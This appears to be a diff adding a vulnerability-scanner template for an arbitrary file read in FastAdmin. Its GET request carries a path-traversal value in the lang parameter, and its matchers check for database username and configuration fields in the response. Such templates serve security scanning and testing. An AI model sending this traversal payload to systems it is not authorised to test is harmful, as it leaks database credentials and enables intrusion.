@@ -1,0 +1,26 @@
+id: poc-yaml-fastadmin-lang-anyfile-read
+info:
+  name: FastAdmin Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index/ajax/lang?lang=../../application/database"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"username\":"
+          - "jsonpReturn"
+          - "\"database\":"
+        part: body
+      - type: word
+        words:
+          - "application/javascript"
+        part: header
+        name: content-type
